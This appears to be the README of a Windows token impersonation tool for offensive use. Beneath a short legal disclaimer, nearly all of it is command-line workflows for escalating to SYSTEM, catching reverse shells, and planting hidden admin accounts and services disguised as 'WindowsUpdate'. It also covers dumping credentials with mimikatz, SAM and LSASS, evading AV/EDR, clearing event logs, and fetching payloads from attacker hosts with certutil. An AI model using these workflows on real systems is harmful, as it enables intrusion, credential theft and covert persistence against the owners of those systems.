# TokenImpersonate
Custom To0ling for TokenImpersonation for Windows OS

Token Impersonation Tool v3.0
Advanced Windows Token Manipulation for Authorized Penetration Testing
A robust C++ tool designed for security professionals to demonstrate and test Windows token impersonation vulnerabilities during authorized penetration tests and red team engagements.

⚠️ LEGAL DISCLAIMER
THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY

Only use on systems you own or have explicit written permission to test
Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide
This tool is provided for educational purposes and authorized security assessments
The authors assume no liability for misuse or damage caused by this program
Always obtain proper authorization before testing


🎯 Purpose
This tool demonstrates Windows token impersonation techniques that leverage the SeImpersonatePrivilege (commonly held by service accounts) to escalate privileges and move laterally within Windows environments. It's designed for:

Red Team Operations: Privilege escalation and lateral movement
Security Assessments: Testing token security controls
Educational Training: Understanding Windows access tokens
Defensive Research: Improving detection capabilities


✨ Features
Core Capabilities

Process Enumeration: List all accessible processes with owner, elevation status, and integrity level
Token Impersonation: Steal and impersonate tokens from other processes
Smart Process Selection: Automatically identifies low-profile SYSTEM processes to avoid AV detection
Brute Force Mode: Attempts impersonation across all processes for a target user until successful
Session Management: Handles token session IDs for proper process creation

Post-Exploitation Operations

Reverse Shell: Base64-encoded PowerShell reverse shell with multiple fallback methods
User Creation: Create new administrator accounts
RDP Enablement: Enable Remote Desktop and configure firewall rules
Flexible Execution: Execute arbitrary commands with impersonated tokens

Evasion Features

Base64 Encoding: PowerShell payloads are UTF-16LE base64-encoded to evade signature detection
Low-Profile Targeting: Prioritizes less-monitored processes (spoolsv.exe, SearchIndexer.exe)
Multiple Execution Methods: Fallback mechanisms for process creation
Hidden Execution: Processes spawn without visible windows


🔧 Requirements
Target System

Windows Server 2016/2019/2022 or Windows 10/11
Account with SeImpersonatePrivilege (IIS service accounts, SQL Server, local admin, etc.)
Network connectivity for reverse shell operations

Build Environment

MinGW-w64 cross-compiler (Linux) or Visual Studio (Windows)
Windows SDK headers


📦 Installation
Compile on Linux (Kali/Parrot)
bash# Install MinGW compiler if not already installed
sudo apt update
sudo apt install mingw-w64

# Clone repository
git clone https://github.com/yourusername/token-impersonation-tool.git
cd token-impersonation-tool

# Compile
x86_64-w64-mingw32-g++ -mconsole -o TokenImpersonate.exe \
    main.cpp tokenImpersonate.cpp \
    -ladvapi32 -static-libgcc -static-libstdc++ -lws2_32

# Transfer to target
upload TokenImpersonate.exe
Compile on Windows
cmd# Using Visual Studio Developer Command Prompt
cl /EHsc main.cpp tokenImpersonate.cpp advapi32.lib ws2_32.lib /Fe:TokenImpersonate.exe
```

---

## 📖 Usage

### Basic Syntax
```
TokenImpersonate.exe <command> [options]
Command Reference
Enumeration
powershell# List all accessible processes
.\TokenImpersonate.exe list

# Filter for specific users
.\TokenImpersonate.exe list | findstr "SYSTEM"
.\TokenImpersonate.exe list | findstr "Administrators"
Impersonation
powershell# Auto-impersonate best SYSTEM process
.\TokenImpersonate.exe auto

# Impersonate specific PID
.\TokenImpersonate.exe <PID>
.\TokenImpersonate.exe 540

# Brute force by username
.\TokenImpersonate.exe brute <USERNAME>
.\TokenImpersonate.exe brute "BUILTIN\Administrators"
.\TokenImpersonate.exe brute "NT AUTHORITY\SYSTEM"
Post-Exploitation
powershell# Spawn reverse shell
.\TokenImpersonate.exe <PID> shell <LHOST> <LPORT>
.\TokenImpersonate.exe 540 shell 192.168.19.128 4444

# Create admin user
.\TokenImpersonate.exe <PID> adduser <USERNAME> <PASSWORD>
.\TokenImpersonate.exe 540 adduser hacker Pass123!

# Enable RDP
.\TokenImpersonate.exe <PID> rdp
.\TokenImpersonate.exe 540 rdp

# Brute force with operations
.\TokenImpersonate.exe brute Administrator shell 192.168.19.128 4444
.\TokenImpersonate.exe brute Administrator adduser backdoor P@ssw0rd!

🎯 COMMON WORKFLOWS
Workflow 1: Basic Privilege Escalation (IIS/Web Server)
Scenario: You have a web shell with low privileges but SeImpersonatePrivilege
powershell# Step 1: Upload the tool
upload TokenImpersonate.exe

# Step 2: Verify privileges
.\TokenImpersonate.exe list

# Step 3: Auto-escalate to SYSTEM
.\TokenImpersonate.exe auto

# Result: New SYSTEM cmd.exe window spawns

Workflow 2: Get SYSTEM Shell via Service Account
Scenario: You compromised a service account (IIS, SQL, etc.)
powershell# Step 1: Check what you have
whoami /priv
# Look for: SeImpersonatePrivilege = Enabled

# Step 2: List accessible processes
.\TokenImpersonate.exe list | findstr "SYSTEM"

# Step 3: Target a SYSTEM process
.\TokenImpersonate.exe 540 shell 192.168.19.128 4444

# Step 4: On Kali - catch the shell
nc -lvnp 4444

Workflow 3: Create Backdoor Admin Account
Scenario: You want persistence via a new admin user
powershell# Step 1: Find a SYSTEM or Admin process
.\TokenImpersonate.exe list | findstr "spoolsv\|SYSTEM"

# Step 2: Create admin user
.\TokenImpersonate.exe 540 adduser backdoor P@ssw0rd123!

# Step 3: Enable RDP for persistence
.\TokenImpersonate.exe 540 rdp

# Step 4: Verify user creation
net user backdoor
net localgroup Administrators

# Step 5: Connect via RDP
xfreerdp /v:192.168.19.135 /u:backdoor /p:'P@ssw0rd123!'
# OR via WinRM
evil-winrm -i 192.168.19.135 -u backdoor -p 'P@ssw0rd123!'

Workflow 4: Brute Force When You Don't Know PIDs
Scenario: You're not sure which process to target
powershell# Step 1: Brute force by username - tries all until one works
.\TokenImpersonate.exe brute "BUILTIN\Administrators"

# Result: Spawns SYSTEM cmd.exe from first working process

# Step 2: Use that to create backdoor
.\TokenImpersonate.exe brute Administrator adduser hacker Pass123!

# Step 3: Or get direct shell
.\TokenImpersonate.exe brute Administrator shell 192.168.19.128 4444

Workflow 5: Lateral Movement from Compromised Machine
Scenario: You have admin on Machine A, want to move to Machine B
powershell# On Machine A (compromised):

# Step 1: Get SYSTEM shell
.\TokenImpersonate.exe auto

# Step 2: In SYSTEM shell, dump credentials
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Step 3: Use credentials to move laterally
evil-winrm -i MachineB -u Administrator -H <NTLM_HASH>

# Step 4: On Machine B, escalate again
.\TokenImpersonate.exe auto

Workflow 6: Web Shell to Full Interactive Shell
Scenario: You have a web shell but want a proper reverse shell
powershell# Step 1: From web shell, upload TokenImpersonate.exe
certutil -urlcache -f http://attacker.com/TokenImpersonate.exe C:\Windows\Tasks\ti.exe

# Step 2: Start listener on Kali
nc -lvnp 4444

# Step 3: Execute from web shell
C:\Windows\Tasks\ti.exe brute Administrator shell 192.168.19.128 4444

# Result: Full reverse shell with SYSTEM privileges

Workflow 7: IIS/SQL Server Privilege Escalation
Scenario: You have code execution as IIS APPPOOL or MSSQL service account
powershell# Step 1: Check privileges
whoami
# IIS APPPOOL\DefaultAppPool or NT SERVICE\MSSQLSERVER

whoami /priv
# SeImpersonatePrivilege = Enabled ✓

# Step 2: Upload tool via current access method
# (web upload, xp_cmdshell, etc.)

# Step 3: Get SYSTEM
.\TokenImpersonate.exe auto

# Step 4: Dump credentials or create backdoor
.\TokenImpersonate.exe brute SYSTEM adduser persist P@ss123!
.\TokenImpersonate.exe brute SYSTEM rdp

Workflow 8: Post-Exploitation Enumeration
Scenario: Enumerate what you can access before taking action
powershell# Step 1: List all processes you can impersonate
.\TokenImpersonate.exe list > processes.txt

# Step 2: Identify high-value targets
type processes.txt | findstr "SYSTEM"
type processes.txt | findstr "Administrators"
type processes.txt | findstr "HIGH"

# Step 3: Target the safest SYSTEM process
.\TokenImpersonate.exe list | findstr "spoolsv"
# spoolsv.exe is usually PID 540

# Step 4: Use it for your objective
.\TokenImpersonate.exe 540 adduser backup SecurePass456!

Workflow 9: Bypassing Protected Processes
Scenario: Some SYSTEM processes are protected, need to find accessible ones
powershell# Step 1: Try auto first
.\TokenImpersonate.exe auto
# May fail if all auto-selected processes are protected

# Step 2: Brute force to find accessible process
.\TokenImpersonate.exe brute "NT AUTHORITY\SYSTEM"
# This tries all SYSTEM processes until one works

# Step 3: Note which PID succeeded
# [+] Successfully impersonated PID 1444

# Step 4: Use that PID for other operations
.\TokenImpersonate.exe 1444 adduser admin Admin123!

Workflow 10: Establishing Multiple Persistence Methods
Scenario: You want multiple backdoors
powershell# Step 1: Create first admin user
.\TokenImpersonate.exe 540 adduser admin1 Password1!

# Step 2: Create second backup user
.\TokenImpersonate.exe 540 adduser admin2 Password2!

# Step 3: Enable RDP
.\TokenImpersonate.exe 540 rdp

# Step 4: Test both accounts
evil-winrm -i target -u admin1 -p Password1!
xfreerdp /v:target /u:admin2 /p:Password2!

# Step 5: Set up scheduled task for reverse shell (from SYSTEM shell)
schtasks /create /tn "WindowsUpdate" /tr "powershell -e <BASE64>" /sc onlogon /ru SYSTEM
```

---

## 📊 WORKFLOW DECISION TREE
```
Do you have SeImpersonatePrivilege?
├─ YES → Continue
└─ NO → Stop, this tool won't work

What's your goal?
├─ Quick SYSTEM shell
│   └─ .\TokenImpersonate.exe auto
│
├─ Reverse shell
│   └─ .\TokenImpersonate.exe brute Administrator shell <IP> <PORT>
│
├─ Persistence
│   ├─ .\TokenImpersonate.exe 540 adduser hacker Pass123!
│   └─ .\TokenImpersonate.exe 540 rdp
│
└─ Enumeration
    └─ .\TokenImpersonate.exe list
```

---

## 🎓 LEARNING PATHS

### Beginner Path
1. Start with `list` command to understand what's available
2. Use `auto` to get first SYSTEM shell
3. Create one test user with `adduser`
4. Practice with known PIDs before brute forcing

### Intermediate Path
1. Use `list` with filters to find optimal targets
2. Understand which processes are protected
3. Use specific PIDs for targeted operations
4. Chain commands for complete compromise

### Advanced Path
1. Brute force by username for automation
2. Combine with other tools (Mimikatz, Rubeus, etc.)
3. Use for lateral movement scenarios
4. Integrate into automated exploitation scripts

---

## 🔥 REAL-WORLD SCENARIOS

### Scenario A: Compromised Web Application
```
Initial Access: Web shell on IIS server
Privileges: IIS APPPOOL\DefaultAppPool
SeImpersonate: Enabled ✓

Workflow:
1. Upload TokenImpersonate.exe via web shell
2. .\TokenImpersonate.exe auto → SYSTEM shell
3. .\TokenImpersonate.exe 540 adduser webadmin Pass123!
4. .\TokenImpersonate.exe 540 rdp
5. RDP in as webadmin (now persistent admin access)
```

### Scenario B: SQL Injection to RCE
```
Initial Access: xp_cmdshell on MSSQL server
Privileges: NT SERVICE\MSSQLSERVER
SeImpersonate: Enabled ✓

Workflow:
1. EXEC xp_cmdshell 'certutil -urlcache -f http://attacker/ti.exe C:\Windows\Tasks\ti.exe'
2. EXEC xp_cmdshell 'C:\Windows\Tasks\ti.exe brute SYSTEM shell 10.10.14.5 4444'
3. Catch reverse SYSTEM shell on Kali
4. From shell: Create persistence, dump creds, pivot
```

### Scenario C: Service Account Compromise
```
Initial Access: Compromised service account credentials
Privileges: domain\svc_account (local admin on server)
SeImpersonate: Enabled ✓

Workflow:
1. evil-winrm -i server -u svc_account -p Password123
2. upload TokenImpersonate.exe
3. .\TokenImpersonate.exe list | findstr SYSTEM
4. .\TokenImpersonate.exe 540 adduser persist SecurePass789!
5. Disconnect and reconnect as persist user
6. Now have persistent admin without service account

Here are pro tips for mastering the Token Impersonation Tool:

🔥 PRO TIPS & ADVANCED TECHNIQUES
1. Process Selection Strategy
powershell# DON'T target these (too protected):
# - smss.exe (PID 400)
# - csrss.exe
# - wininit.exe  
# - lsass.exe
# - services.exe

# DO target these (accessible SYSTEM processes):
.\TokenImpersonate.exe list | findstr "spoolsv\|SearchIndexer\|dllhost\|msdtc\|svchost"

# Best targets in order:
# 1. spoolsv.exe (Print Spooler) - rarely monitored
# 2. SearchIndexer.exe - low priority service
# 3. dllhost.exe - generic COM host
# 4. msdtc.exe - rarely used
# 5. svchost.exe - pick one with SYSTEM privileges
2. Use Your Own Process for Stealth
powershell# Instead of targeting random processes, use your current shell
$pid
Get-Process -Id $pid

# Then use YOUR PID (you already have access to it)
.\TokenImpersonate.exe 6312 adduser hacker Pass123!

# Why? No failed access attempts logged, cleaner operation
3. Brute Force is Your Friend
powershell# Don't guess PIDs - let brute force find what works
.\TokenImpersonate.exe brute Administrator shell 192.168.19.128 4444

# It will:
# 1. Find all matching processes
# 2. Try each one automatically
# 3. Skip protected processes
# 4. Stop when one succeeds
4. Chain Commands for Speed
powershell# Create backdoor + enable RDP in one go
.\TokenImpersonate.exe 540 adduser hacker Pass123! && .\TokenImpersonate.exe 540 rdp

# Or use && to chain operations
.\TokenImpersonate.exe brute Administrator adduser hacker Pass123! && net localgroup Administrators
5. Persistence Techniques
powershell# Method 1: Hidden admin account
.\TokenImpersonate.exe 540 adduser sysupdate P@ssw0rd123!
net user sysupdate /active:yes

# Method 2: Enable RDP for remote access
.\TokenImpersonate.exe 540 rdp

# Method 3: Add to scheduled task (manual)
# In SYSTEM cmd spawned by tool:
schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -enc <base64>" /sc onlogon /ru SYSTEM

# Method 4: Service creation
sc create "WindowsUpdateService" binPath= "C:\Windows\Tasks\backdoor.exe" start= auto
sc start "WindowsUpdateService"
6. Troubleshooting Failed Shells
powershell# If shell doesn't connect, test network first
Test-NetConnection -ComputerName 192.168.19.128 -Port 4444

# Check if PowerShell is blocked
Get-MpPreference | Select ExclusionPath

# Try different execution methods
.\TokenImpersonate.exe 540 adduser hacker Pass123!
# Then use evil-winrm instead:
evil-winrm -i <target> -u hacker -p Pass123!
7. Avoiding Detection
powershell# 1. Use low-profile SYSTEM processes (not services.exe)
.\TokenImpersonate.exe list | findstr "spoolsv\|SearchIndexer"

# 2. Clean up after yourself
del TokenImpersonate.exe
Remove-Item C:\Windows\Tasks\*.ps1

# 3. Use local processes (your own PID)
.\TokenImpersonate.exe $pid adduser hacker Pass123!

# 4. Avoid spawning new cmd windows (use existing)
.\TokenImpersonate.exe 6312 shell 192.168.19.128 4444

# 5. Time your operations during business hours
# Less suspicious when admins are actively working
8. Session Awareness
powershell# Check current session
query session

# Spawned processes go to Session 0 (invisible)
# Use existing session processes instead:
Get-Process | Where {$_.SessionId -eq 1} | findstr "cmd"

# Or just use your current process PID
.\TokenImpersonate.exe $pid shell 192.168.19.128 4444
9. Privilege Checks
powershell# Always verify before running
whoami /priv | findstr "SeImpersonate\|SeDebug"

# If missing SeImpersonatePrivilege:
# - Tool won't work
# - You need a different exploit (PrintSpoofer, JuicyPotato, etc.)

# If missing SeDebugPrivilege:
# - Tool will try to enable it
# - May fail on some protected processes
10. Alternative Payload Delivery
powershell# Instead of reverse shell, use the tool to download payloads

# Method 1: Create user then WinRM
.\TokenImpersonate.exe 540 adduser hacker Pass123!
evil-winrm -i 192.168.19.135 -u hacker -p Pass123!

# Method 2: Use tool to download and execute
# First spawn SYSTEM cmd:
.\TokenImpersonate.exe auto
# In SYSTEM cmd:
certutil -urlcache -f http://192.168.19.128:8000/shell.exe C:\Windows\Tasks\s.exe
C:\Windows\Tasks\s.exe

# Method 3: Enable RDP and GUI access
.\TokenImpersonate.exe 540 rdp
.\TokenImpersonate.exe 540 adduser hacker Pass123!
xfreerdp /v:192.168.19.135 /u:hacker /p:Pass123!
11. Rapid Reconnaissance
powershell# Quick wins after getting SYSTEM
.\TokenImpersonate.exe auto

# In SYSTEM cmd that opens:
# Dump SAM
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Check for interesting files
dir /s /b C:\*password*.txt
dir /s /b C:\*config*.xml

# Dump LSASS (requires admin)
procdump.exe -ma lsass.exe lsass.dmp
12. Multi-Target Operations
powershell# Create user on multiple targets
$targets = @("192.168.19.135", "192.168.19.136", "192.168.19.137")

foreach ($target in $targets) {
    evil-winrm -i $target -u admin -p pass -e . -s . -c ".\TokenImpersonate.exe 540 adduser hacker Pass123!"
}
13. Know Your Environment
powershell# Check for EDR/AV before running
Get-Service | Where {$_.DisplayName -like "*defender*" -or $_.DisplayName -like "*antivirus*"}
Get-Process | Where {$_.ProcessName -like "*sentinel*" -or $_.ProcessName -like "*carbon*"}

# If EDR present:
# - Use brute force (tries until success)
# - Avoid spawning new processes
# - Use existing shell PID
# - Create user instead of shell
14. Emergency Cleanup
powershell# If detected, remove evidence
net user hacker /delete
del TokenImpersonate.exe
Clear-EventLog -LogName Security
Clear-EventLog -LogName System
15. Smart Combinations
powershell# Combo 1: Silent persistence
.\TokenImpersonate.exe brute Administrator adduser svc-admin P@ssw0rd123!
.\TokenImpersonate.exe 540 rdp
# No shells = less detection

# Combo 2: Multiple backdoors
.\TokenImpersonate.exe 540 adduser backup1 Pass1!
.\TokenImpersonate.exe 540 adduser backup2 Pass2!
# Redundancy if one is discovered

# Combo 3: List, verify, execute
.\TokenImpersonate.exe list | findstr "SYSTEM" > procs.txt
# Review procs.txt
.\TokenImpersonate.exe 540 shell 192.168.19.128 4444

# Combo 4: Your PID + Brute force fallback
.\TokenImpersonate.exe $pid adduser hacker Pass123!
# If fails:
.\TokenImpersonate.exe brute Administrator adduser hacker Pass123!
16. Debugging Tips
powershell# If tool says SUCCESS but nothing happens:
# 1. Process likely spawned in Session 0 (invisible)
# 2. Use your current PID instead
# 3. Or create user and connect via WinRM/RDP

# If "Failed to open process token":
# 1. Process is protected - pick different PID
# 2. Try brute force instead

# If shell spawns but closes immediately:
# 1. Network blocked (firewall/AV)
# 2. Create user and use WinRM instead
# 3. Check listener is actually running

# If no SeImpersonatePrivilege:
# 1. Wrong user context (need IIS, SQL, or service account)
# 2. Use different exploit first (PrintSpoofer, JuicyPotato)

🎓 ULTIMATE PRO WORKFLOW
powershell# 1. Check privileges
whoami /priv

# 2. Enumerate accessible processes
.\TokenImpersonate.exe list | findstr "SYSTEM"

# 3. Try your own PID first (stealth)
.\TokenImpersonate.exe $pid adduser hacker Pass123!

# 4. If that fails, brute force
.\TokenImpersonate.exe brute Administrator adduser hacker Pass123!

# 5. Enable RDP for GUI access
.\TokenImpersonate.exe 540 rdp

# 6. Connect via multiple methods
evil-winrm -i 192.168.19.135 -u hacker -p Pass123!
# OR
xfreerdp /v:192.168.19.135 /u:hacker /p:Pass123!

# 7. Clean up
del TokenImpersonate.exe

⚡ ONE-LINER WINS
powershell# Instant SYSTEM shell
.\TokenImpersonate.exe auto

# Instant admin user
.\TokenImpersonate.exe brute Administrator adduser hacker Pass123!

# Instant RDP access
.\TokenImpersonate.exe 540 adduser hacker Pass123! ; .\TokenImpersonate.exe 540 rdp

# Use current process (cleanest)
.\TokenImpersonate.exe $pid adduser hacker Pass123!
